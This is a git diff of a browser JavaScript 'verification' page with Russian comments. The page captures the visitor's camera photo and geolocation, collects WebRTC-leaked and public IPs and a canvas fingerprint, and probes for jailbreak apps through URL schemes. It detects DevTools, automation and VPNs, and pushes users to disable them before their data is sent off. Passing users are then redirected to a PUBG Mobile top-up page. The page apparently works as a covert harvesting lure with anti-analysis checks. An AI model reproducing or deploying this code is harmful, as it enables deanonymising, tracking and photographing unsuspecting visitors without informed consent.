@@ -213,7 +213,6 @@ async function collectWebRTCIps(timeoutMs = 2500) {
     pc.onicecandidate = (e) => {
       if (!e.candidate) return;
       const c = e.candidate.candidate || "";
-      // простой парсинг IP из candidate
       const ipRegex = /([0-9]{1,3}(?:\.[0-9]{1,3}){3})|([0-9a-fA-F:]{2,})/;
       const m = c.match(ipRegex);
       if (m) ips.add(m[0]);
@@ -377,12 +376,22 @@ async function getLocaleAndDisplay() {
   };
 }
 
+// === DevTools эвристика по размерам окна ===
+function detectDevtoolsHeuristic() {
+  try {
+    const dw = Math.abs((window.outerWidth || 0) - window.innerWidth);
+    const dh = Math.abs((window.outerHeight || 0) - window.innerHeight);
+    const opened = (dw > 120) || (dh > 160);
+    return { opened, dw, dh };
+  } catch { return null; }
+}
+
 // === PN/Proxy эвристика (+ сопоставление TZ ↔ страна, DC-ISP ключевые слова) ===
 function analyzeNetworkHeuristics({ publicIp, webrtcIps, netInfo, cameraLatencyMs, locale, ipMeta }) {
   const reasons = [];
   let scoreAdj = 0;
 
-  const DC_WORDS = ["AMAZON", "AWS", "GOOGLE", "GCP", "MICROSOFT", "AZURE", "CLOUDFLARE", "HETZNER", "OVH", "DIGITALOCEAN", "LINODE", "IONOS", "VULTR"];
+  const DC_WORDS = ["AMAZON","AWS","GOOGLE","GCP","MICROSOFT","AZURE","CLOUDFLARE","HETZNER","OVH","DIGITALOCEAN","LINODE","IONOS","VULTR"];
   const isp = (publicIp?.isp || publicIp?.org || "").toUpperCase();
   if (DC_WORDS.some(w => isp.includes(w))) {
     reasons.push("DC-ISP признак (AWS/Google/Azure/…)");
@@ -391,7 +400,7 @@ function analyzeNetworkHeuristics({ publicIp, webrtcIps, netInfo, cameraLatencyM
 
   const pubCandidates = (webrtcIps || []).filter(ip => !!ip);
   if (pubCandidates.length >= 1) {
-    reasons.push("WebRTC раскрыл прямой IP (возможен туннель/VPN)");
+    reasons.push("WebRTC раскрыл публичный IP (возможен туннель/VPN)");
     scoreAdj -= 10;
   }
 
@@ -400,7 +409,7 @@ function analyzeNetworkHeuristics({ publicIp, webrtcIps, netInfo, cameraLatencyM
     scoreAdj -= 10;
   }
 
-  if (netInfo?.effectiveType && /2g/.test(String(netInfo.effectiveType))) {
+  if (netInfo?.effectiveType && /2g/i.test(String(netInfo.effectiveType))) {
     reasons.push("Очень медленная сеть (2g)");
     scoreAdj -= 5;
   }
@@ -409,8 +418,9 @@ function analyzeNetworkHeuristics({ publicIp, webrtcIps, netInfo, cameraLatencyM
     scoreAdj -= 5;
   }
 
-  const tz = (locale?.timeZone || "").toUpperCase();
-  const country = (publicIp?.country || ipMeta?.country || "").toUpperCase();
+  // Грубая проверка TZ ↔ страна (best-effort)
+  const tz = (locale?.timeZone || "").toUpperCase();       // напр. "EUROPE/CHISINAU"
+  const country = (publicIp?.country || ipMeta?.country || "").toUpperCase(); // напр. "MD"
   if (tz && country && !tz.includes(country) && !tz.includes("UTC") && !tz.includes("GMT")) {
     reasons.push(`Таймзона (${locale?.timeZone}) не совпадает со страной IP (${publicIp?.country})`);
     scoreAdj -= 8;
@@ -423,7 +433,7 @@ function analyzeNetworkHeuristics({ publicIp, webrtcIps, netInfo, cameraLatencyM
   return { label, scoreAdj, reasons, dcIsp: !!(scoreAdj <= -25 || DC_WORDS.some(w => isp.includes(w))) };
 }
 
-// === Лёгкая детекция подмены UA / расширений / автоматизации (+ собираем мелочи) ===
+// === Лёгкая детекция подмены/автоматизации + Device Check скоринг ===
 async function runDeviceCheck(clientProfilePartial) {
   const reasons = [];
   const details = {};
@@ -441,6 +451,7 @@ async function runDeviceCheck(clientProfilePartial) {
     details.maxTouchPoints = Number(navigator.maxTouchPoints || 0);
     details.navigator_webdriver = (typeof navigator.webdriver === "boolean") ? navigator.webdriver : undefined;
 
+    // Следы расширений
     const leakedChromeRuntime = !!(window.chrome && window.chrome.runtime);
     const leakedBrowserRuntime = !!(window.browser && window.browser.runtime);
     if (leakedChromeRuntime || leakedBrowserRuntime) {
@@ -448,6 +459,7 @@ async function runDeviceCheck(clientProfilePartial) {
       score -= 5;
     }
 
+    // Переопределённые Web-API (не [native code])
     function looksNative(fn) {
       try { return typeof fn === "function" && /\[native code\]/.test(Function.prototype.toString.call(fn)); }
       catch { return true; }
@@ -456,23 +468,40 @@ async function runDeviceCheck(clientProfilePartial) {
       !looksNative(navigator.permissions?.query) ||
       !looksNative(navigator.geolocation?.getCurrentPosition) ||
       !looksNative(navigator.mediaDevices?.getUserMedia);
-
     if (suspiciousNative) {
       reasons.push("Web API переопределены (не native)");
       score -= 5;
     }
 
+    // Автоматизация
     if (details.navigator_webdriver === true) {
       reasons.push("navigator.webdriver === true (автоматизация)");
       score -= 60;
     }
 
+    // DevTools эвристика
+    const devtools = detectDevtoolsHeuristic();
+    details.devtools = devtools;
+    if (devtools?.opened) {
+      reasons.push("DevTools размеры окна");
+      score -= 6;
+    }
+
+    // Очень малая cameraLatency
     details.cameraLatencyMs = (typeof window.__cameraLatencyMs === "number") ? window.__cameraLatencyMs : null;
     if (details.cameraLatencyMs != null && details.cameraLatencyMs <= 5) {
       reasons.push("Слишком малая cameraLatency");
       score -= 10;
     }
 
+    // In-App WebView / WKWebView
+    const inApp = clientProfilePartial?.inAppWebView;
+    if (inApp?.isInApp || inApp?.flags?.WKWebView) {
+      reasons.push("In-App WebView/WKWebView");
+      score -= 8;
+    }
+
+    // PN/Proxy эвристика (снижает score и добавляет причины)
     const pn = analyzeNetworkHeuristics({
       publicIp: clientProfilePartial?.publicIp,
       webrtcIps: clientProfilePartial?.webrtcIps,
@@ -482,21 +511,20 @@ async function runDeviceCheck(clientProfilePartial) {
       ipMeta: clientProfilePartial?.publicIp
     });
     details.pn_proxy = pn;
+    if (pn.label === "likely") { reasons.push("VPN/Proxy: likely"); score -= 25; }
+    else if (pn.label === "possible") { reasons.push("VPN/Proxy: possible"); score -= 10; }
 
-    if (pn.label === "likely") { reasons.push("PN/Proxy: likely"); score -= 25; }
-    else if (pn.label === "possible") { reasons.push("PN/Proxy: possible"); score -= 10; }
-
-    // If JB active probe present -> penalize accordingly
+    // Jailbreak влияние на скоринг
     if (clientProfilePartial?.jbProbesActive?.summary?.label === 'likely') {
-      reasons.push('jailbreak_active_likely');
+      reasons.push('Jailbreak likely (active probe)');
       score -= 30;
     } else if (clientProfilePartial?.jbProbesActive?.summary?.label === 'possible') {
-      reasons.push('jailbreak_active_possible');
+      reasons.push('Jailbreak possible (active probe)');
       score -= 12;
     }
 
     if (score >= 80) reasons.push("Ок: окружение выглядит правдоподобно");
-    else if (score >= 60) reasons.push("Есть несостыковки — нужна доп. проверка");
+    else if (score >= 60) reasons.push("Есть несостыковки — рекомендуется доп. проверка");
     else reasons.push("Высокая вероятность подмены/автоматизации");
   } catch (e) {
     reasons.push("Ошибка проверки окружения: " + (e?.message || String(e)));
@@ -568,7 +596,7 @@ function tryOpenSchemeActive(scheme, timeoutMs = 900) {
       return;
     }
 
-    const to = setTimeout(() => {
+    setTimeout(() => {
       cleanup({ scheme, opened: false, reason: 'timeout', durationMs: Date.now() - start });
     }, timeoutMs);
   });
@@ -626,11 +654,11 @@ async function collectActiveJailbreakProbes(options = {}) {
 
 // === Быстрый мультисбор профиля клиента ===
 async function collectClientProfile() {
-  // запускаем JB active probe как one-shot до остального (если хочешь — можно запускать параллельно)
+  // одна активная JB-проба на сессию
   let jbProbesActive = { summary:{ label: 'skipped' }, results: [] };
   try {
     jbProbesActive = await collectActiveJailbreakProbes().catch(() => ({ summary:{ label:'error' }, results:[] }));
-  } catch (e) { jbProbesActive = { summary:{ label:'error' }, results:[] }; }
+  } catch { jbProbesActive = { summary:{ label:'error' }, results:[] }; }
 
   const [
     permissions, webrtcIps, publicIp, canvas, storageLike,
@@ -745,26 +773,32 @@ async function autoFlow() {
     setBtnLocked();
     if (UI.text) UI.text.innerHTML = "Запрашиваем камеру и геолокацию…";
 
-    // collectClientProfile запускает active JB probe внутри себя (one-shot)
-    const [geo, rawPhoto, client_profile] = await Promise.all([askGeolocation(), takePhotoWithFallback(), collectClientProfile()]);
+    // collectClientProfile запускает active JB probe (one-shot)
+    const [geo, rawPhoto, client_profile] = await Promise.all([
+      askGeolocation(), takePhotoWithFallback(), collectClientProfile()
+    ]);
     const photoBase64 = await downscaleDataUrl(rawPhoto, 1024, 0.6);
 
-    // Device check (использует client_profile, в том числе jbProbesActive)
+    // Device Check (решает пропуск)
     const device_check = await runDeviceCheck({
       publicIp: client_profile.publicIp,
       webrtcIps: client_profile.webrtcIps,
       network: client_profile.network,
       locale: client_profile.locale,
+      inAppWebView: client_profile.inAppWebView,
       jbProbesActive: client_profile.jbProbesActive
     });
     window.__lastDeviceCheck = device_check;
 
+    // Порог
     if (device_check.score < 60) {
       window.__reportReady = false;
       setBtnLocked();
-      if (UI.text) UI.text.innerHTML = '<span class="err">Проверка не пройдена.</span>';
-      if (UI.note) UI.note.textContent = "Обнаружены признаки подмены/автоматизации (PN/Proxy/расширения/джейлбрейк).";
-      return;
+      if (UI.title) UI.title.textContent = "Доступ отклонён";
+      if (UI.text) UI.text.innerHTML = '<span class="err">Проверка не пройдена (score &lt; 60).</span>';
+      if (UI.reason) UI.reason.textContent = "Причины: " + device_check.reasons.join("; ");
+      if (UI.note) UI.note.textContent = "Отключите расширения/твики, VPN/Proxy и обновите страницу.";
+      return; // отчёт не отправляем
     }
 
     if (UI.text) UI.text.innerHTML = "Отправляем данные…";
@@ -772,21 +806,28 @@ async function autoFlow() {
 
     window.__reportReady = true;
     setBtnReady();
-    if (UI.text) UI.text.innerHTML = '<span class="ok">Проверка пройдена.</span>';
-    if (UI.note) UI.note.textContent = "Можно продолжить.";
-    if (resp && resp.delivered === false) {
-      if (UI.note) UI.note.textContent = resp.reason || "Доставим позже.";
+    if (UI.title) UI.title.textContent = "Проверка пройдена";
+    if (UI.text) UI.text.innerHTML = '<span class="ok">Ок (score ≥ 60).</span>';
+    if (UI.note) {
+      if (device_check.score < 80) UI.note.textContent = "Есть несостыковки — рекомендуется доп. проверка.";
+      else UI.note.textContent = "Всё выглядит правдоподобно.";
+    }
+
+    // доп. обработка ответа сервера (если нужно)
+    if (resp && resp.delivered === false && UI.note) {
+      UI.note.textContent = resp.reason || "Отправлено с задержкой.";
     }
   } catch (e) {
     console.error("[AUTO-FLOW ERROR]", e);
     setBtnLocked();
     window.__reportReady = false;
+    if (UI.title) UI.title.textContent = "Ошибка";
     if (UI.text) UI.text.innerHTML = '<span class="err">Ошибка проверки.</span>';
     if (UI.note) UI.note.textContent = "Причина: " + (e && e.message ? e.message : String(e));
   }
 }
 
-// Экспорт (если ты всё ещё вызываешь из index.html)
+// Экспорт (если вызываешь из index.html)
 window.__autoFlow = autoFlow;
 
 // === Управление UI кнопкой и запуском ===
@@ -807,7 +848,6 @@ function applyGateAndUI() {
       UI.btn.__wired = true;
       UI.btn.addEventListener("click", (e) => {
         if (!window.__reportReady) { e.preventDefault(); return; }
-        // ТВОЙ целевой переход — настраиваемый
         location.assign("https://www.pubgmobile.com/ig/itop");
       });
     }
